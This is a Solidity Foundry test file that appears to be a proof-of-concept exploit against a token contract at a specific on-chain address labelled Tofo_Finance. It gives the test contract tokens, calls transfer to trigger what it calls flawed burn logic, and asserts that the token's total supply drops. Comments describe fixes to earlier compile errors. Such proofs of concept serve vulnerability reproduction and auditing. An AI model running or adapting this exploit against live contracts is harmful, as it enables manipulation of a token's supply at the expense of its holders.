// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Added the interface for the target contract to allow the compiler to recognize the function calls.
interface TofoFinance {
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x19E506BbF1d8Dbd08e963229434634664A577111;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "Tofo_Finance");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        uint256 pre_exploit_totalSupply = TofoFinance(TARGET).totalSupply();

        // Precondition [token_balance]: Attacker must have a non-zero balance of the TOFU token.
        // We use `deal` to give the attacker 1000 tokens (decimals are 9).
        uint256 attackerInitialBalance = 1000 * 1e9;
        deal(TARGET, attacker, attackerInitialBalance);

        // Precondition [state]: The contract's totalSupply must be greater than 5_000_000_000e9.
        // The default totalSupply is 10_000_000_000e9, so this is met.
        assertGt(pre_exploit_totalSupply, 5_000_000_000 * 1e9, "Initial totalSupply is not above the required threshold");

        // Exploit: Call `transfer` to trigger the flawed burn logic.
        uint256 amountToTransfer = 100 * 1e9;
        TofoFinance(TARGET).transfer(address(0xdead), amountToTransfer);

        // Oracle Verification: Check if totalSupply was tampered (decreased).
        uint256 post_exploit_totalSupply = TofoFinance(TARGET).totalSupply();
        assertLt(post_exploit_totalSupply, pre_exploit_totalSupply, "Exploit failed: totalSupply did not decrease");

        // Corrected the undeclared variable 'totalSupply' to 'post_exploit_totalSupply' and removed the invalid curly braces syntax.
        assertLt(post_exploit_totalSupply, pre_exploit_totalSupply, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

